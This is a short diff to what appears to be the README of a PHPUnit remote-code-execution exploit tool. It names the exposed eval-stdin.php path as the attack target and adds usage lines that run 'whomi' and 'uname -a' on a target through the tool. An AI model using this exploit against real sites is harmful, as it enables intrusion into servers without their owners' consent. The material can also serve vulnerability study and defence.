@@ -9,3 +9,7 @@ data beginning with a "<?php " substring, as demonstrated by an attack
 on a site with an exposed /vendor folder, i.e., external access to 
 the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI.
 
+# Command
+php PHPunit-RCE.php whomi //for single string command
+
+php PHPunit-RCE.php 'uname -a' //for multiple string command
